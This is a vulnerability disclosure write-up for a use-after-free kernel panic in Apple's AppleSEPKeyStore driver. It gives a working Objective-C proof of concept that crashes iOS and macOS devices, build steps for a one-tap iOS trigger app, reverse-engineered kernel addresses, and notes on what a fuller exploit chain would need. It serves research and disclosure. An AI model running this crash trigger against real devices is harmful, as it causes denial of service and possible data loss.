# AppleSEPKeyStore Use-After-Free Panic

CVE: Pending | Author: [@zeroxjf](https://x.com/zeroxjf)

## Warning

**This code WILL crash your device.** Running these tools causes an immediate kernel panic.

- Save all work before running
- Potential for data loss on unsaved files
- Repeated panics may cause filesystem corruption
- Not responsible for boot loops, data loss, or bricked devices
- For security research purposes only

## Target

| | |
|--|--|
| iOS | 26.1 - 26.2 |
| macOS | 26.1 - 26.2 |
| Component | `com.apple.driver.AppleSEPKeyStore` |
| Kernel | Darwin 25.1.0 (xnu-12377.42.6) |

## Vulnerability

Use-after-free in IOCommandGate triggered via AppleSEPKeyStore. The kernel detects modification of a freed element at offset 72, indicating memory corruption after deallocation. This is a race condition where the command gate's internal state is accessed after being freed.

## Proof of Concept

```objc
// Open with type 0x2022
io_connect_t conn;
IOServiceOpen(service, mach_task_self(), 0x2022, &conn);

// Call selector 2 repeatedly (~41 times triggers UAF panic)
for (int i = 0; i < 50; i++) {
    uint64_t scalars[6] = {1, 0, 0, 0x10, 0, 0};
    uint64_t out[1];
    uint32_t outCnt = 1;

    IOConnectCallMethod(conn, 2, scalars, 6, NULL, 0,
                        out, &outCnt, NULL, NULL);
    usleep(1000);  // 1ms delay
}
// UAF detected around call #41
```

## Panic Log

```
panic(cpu 4 caller 0xfffffff015b84ae0): [iokit.IOCommandGate]: element modified after free
  (off:72, val:0xfffffffffffffe00, sz:80, ptr:0xffffffe69b7d0db0)
   72: 0xfffffffffffffe00

Kernel version: Darwin Kernel Version 25.1.0: Thu Oct 23 11:09:22 PDT 2025;
  root:xnu-12377.42.6~55/RELEASE_ARM64_T8030

Panicked task 0xffffffe5b4f1e820: pid 956: Test

Kernel Extensions in backtrace:
   com.apple.driver.AppleSEPKeyStore(2.0)[AD3CDADB-06B6-32F5-9E47-9889901353CA]
      @0xfffffff016a47020->0xfffffff016a84f9f
```

## Analysis

| Property | Value |
|----------|-------|
| Bug Type | Use-After-Free (element modified after free) |
| Component | `iokit.IOCommandGate` |
| Corrupted Offset | 72 bytes into freed element |
| Corrupted Value | `0xfffffffffffffe00` |
| Element Size | 80 bytes |
| Element Pointer | `0xffffffe69b7d0db0` |
| Trigger | ~41 consecutive calls to selector 2 |
| Reproducibility | 100% deterministic |

### Termination Path (IOKit)

AppleKeyStore's teardown uses the standard IOService termination cascade:

- `IOService::terminatePhase1` → `IOService::stop1` → AppleKeyStore `stop` override (`FUN_fffffff0096a695c`)
- The stop override releases the workloop (and its event sources), which implicitly frees the `IOCommandGate`.
- The wait loop (`FUN_fffffff0096ad010`) continues to call `commandSleep` on the gate during selector 2, creating the UAF window.
- There is also an explicit test-only terminate call path (`AppleKeyStoreTest::terminate()`), but production paths rely on IOService termination.

## IOCommandGate Lifecycle Analysis

Traced the IOCommandGate lifecycle around the AppleSEPKeyStore command handler and wait loop, confirming where the gate is created, used, and where the UAF window occurs.

### Creation (start/init)

`FUN_fffffff0096a619c` builds the workloop and creates the IOCommandGate:

```
param_1[0x15] = FUN_fffffff0086e7e1c();                    // workloop
param_1[0x2d] = FUN_fffffff0086eb840(param_1, 0);          // IOCommandGate::commandGate (this+0x168)
(**(code **)(*(long *)param_1[0x15] + 0xa0))(..., param_1[0x2d]);  // workloop adds gate
```

This matches the 0x50 IOCommandGate allocation and places the gate pointer at offset `0x168`.

### Use (command handler + wait loop)

**Command Handler** (`FUN_fffffff0096abb18`):
- Repeatedly touches `param_1 + 0x168` and `param_1 + 0x170`
- Calls through gate vtable with PAC (`autda`/`blraa`)
- Vtable offset `0x100` call is consistent with `commandWakeup`

**Wait Loop** (`FUN_fffffff0096ad010`):
- Performs timed sleep via `FUN_fffffff0096ef3c8(..., 6000)` + `FUN_fffffff007fea344(..., &local_28)`
- Gate call: `(**(code **)(lVar2 + 0x110))(…, *(param_1 + 0x168), *(param_1 + 0x170), local_28, 0);`
- Vtable offset `0x110` matches `IOCommandGate::commandSleep` path

### Gated Work (action function)

`FUN_fffffff00968d5d4` is the gated `performCommandGated` path (string ref at `0xfffffff0075b0b54`), invoked under the command gate via `runAction`. This aligns with the selector-driven loop: selector 2 repeatedly enters this gated handler and the wait loop.

### Call Graph (selector 2 → UAF)

```
IOConnectCallMethod selector 2
  -> dispatch table entry @0xfffffff00ad47276
  -> FUN_fffffff0096abafc (wrapper)
      -> FUN_fffffff0096abb18 (AppleSEPKeyStore command handler)
          -> FUN_fffffff0096ad010 (wait loop)
              -> IOCommandGate::commandSleep (vtable +0x110)
```

### Selector 2 Path Mapping

- The selector dispatch table includes an entry at `0xfffffff00ad47276` that points to `FUN_fffffff0096abafc`.
- `FUN_fffffff0096abafc` forwards into the main handler `FUN_fffffff0096abb18`.
- `FUN_fffffff0096abb18` loops on `FUN_fffffff0096ad010`, which calls `IOCommandGate::commandSleep` (vtable +0x110).
- This is the hot path exercised by the PoC’s selector 2 loop.

### UAF Window

| Evidence | Detail |
|----------|--------|
| Gate location | Created at `this+0x168`, used in both command handler and wait loop |
| Panic signature | "element modified after free" on 0x50 object matches IOCommandGate |
| Race condition | Gate freed/removed from workloop (stop/close/free path) while wait loop still calling `commandSleep`/`commandWakeup` |
| Trigger | Hammering selector 2 produces the IOCommandGate UAF signature |

### Teardown Path (root cause)

`FUN_fffffff0096a695c` is the teardown/stop/free method that creates the race:

```
// Teardown sequence
(**(code **)(vtable + 0x488))(...);                        // quiesce/stop
(**(code **)(*(long *)param_1[0x15] + 0x28))();            // release workloop
PTR_DAT_fffffff007d868c8 + 0x2c8                           // base class cleanup
// NOTE: No explicit removeEventSource/release of param_1[0x2d] (command gate)
```

**Why this frees the gate:**
- The command gate is owned/retained by the workloop
- Releasing the workloop frees its event sources (including the gate)
- No explicit `removeEventSource` or release of `param_1[0x2d]`

**The race:**
- `FUN_fffffff0096a695c` runs while `FUN_fffffff0096ad010` is in-flight
- Workloop release frees the command gate
- Wait loop continues calling `commandSleep` (vtable +0x110) on freed gate
- Result: "element modified after free"

### Address Reference

| Function | Address | Role |
|----------|---------|------|
| Gate setup | `FUN_fffffff0096a619c` | Creates workloop (`param_1[0x15]`) and gate (`param_1[0x2d]`) |
| Wait loop | `FUN_fffffff0096ad010` | Calls gate vtable +0x110 (`commandSleep`) |
| runAction | `FUN_fffffff0096a6898` | Calls gate vtable +0xe8 |
| Teardown | `FUN_fffffff0096a695c` | Releases workloop, implicitly frees gate |

The concrete race: stop/free path drops the workloop (freeing the gate) without synchronizing with the wait loop or clearing `param_1[0x2d]`, while the handler (`FUN_fffffff0096abb18`) keeps calling `FUN_fffffff0096ad010` on selector 2.

### External Trigger Chain

`FUN_fffffff0096a695c` is the AppleKeyStore `stop` override, placed in the vtable at `0xfffffff007d87a00` (immediately after the `start` override at `0xfffffff007d879f8`).

**Termination dispatch chain:**

```
1. External event (service termination / kext unload / client-triggered terminate)
   → IOService::terminate(...)

2. IOService::terminatePhase1 (FUN_fffffff0086a345c)
   → enters termination cascade

3. IOService::stop1 (FUN_fffffff0086a2e44)
   → calls vtable stop slot (*param_1 + 0x2b8)

4. AppleKeyStore::stop (FUN_fffffff0096a695c)
   → releases workloop, frees gate
```

**Visible external caller:**

`FUN_fffffff0096a31b8` logs `"AppleKeyStoreTest::%s: terminate() failed.\n"` and calls vtable slot +0x2f0 (`IOService::terminate`). This is a concrete entry point that triggers the stop/teardown chain.

**Vtable layout (relevant slots):**

| Offset | Address | Method |
|--------|---------|--------|
| +0x2b8 | `0xfffffff007d87a00` | AppleKeyStore::stop (`FUN_fffffff0096a695c`) |
| +0x2f0 | - | IOService::terminate |
| - | `0xfffffff007d879f8` | AppleKeyStore::start (`FUN_fffffff0096a619c`) |

This confirms the UAF trigger: any path that terminates the AppleKeyStore service will call `FUN_fffffff0096a695c`, which releases the workloop without synchronizing against the wait loop still using the command gate.

## Files

- `poc.m` - Standalone macOS proof of concept
- `ios-app/` - iOS app with one-tap trigger
- `panic.log` - Full kernel panic log from iOS device

## Building

### macOS (poc.m)

```bash
clang -framework Foundation -framework IOKit poc.m -o poc
./poc
```

### iOS App

1. Open `ios-app/Test.xcodeproj` in Xcode
2. Select your iOS device (requires iOS 26.1-26.2)
3. Build and run
4. Tap **SEP PANIC** button

The iOS app provides a single red button that triggers the SEP exhaustion. Device will panic around call #41.

## Exploitation Status

### Summary

| Aspect | Status |
|--------|--------|
| Info Leak | None - panic causes reboot, KASLR re-randomized |
| Direct Exploitation | Blocked by PAC (Pointer Authentication) |
| Zone Type | Typed/sequestered (`iokit.IOCommandGate`) |
| Vtable Hijack | All calls PAC-protected (`autda`/`blraa`) |

### Mitigations Encountered

- **PAC**: All vtable calls authenticated; failure triggers `brk #0xc472`
- **Zone Integrity**: Freed memory checked on reallocation
- **Typed Zones**: IOCommandGate in separate zone, harder to spray

### Potential Chain Requirements

1. This bug for KASLR bypass (heap address in panic)
2. PAC signing gadget or bypass
3. Heap spray primitive (zone exhaustion + kalloc.80 spray)
4. Separate write primitive

### Key Kernel Addresses (iOS 26.1)

```
0xfffffff0096abb18  AppleSEPKeyStore command handler
0xfffffff0096ad010  Wait loop (UAF trigger point)
0xfffffff007d887e0  Selector dispatch table
0xfffffff0086eb4b8  IOCommandGate initialization (80 bytes)
0xfffffff0087e09f4  Zone panic handler
```

## Tested

- iPhone 11 Pro Max
- iPhone 17 Pro Max
- MacBook Pro (M2 Max)
- MacBook Pro (M4 Max)
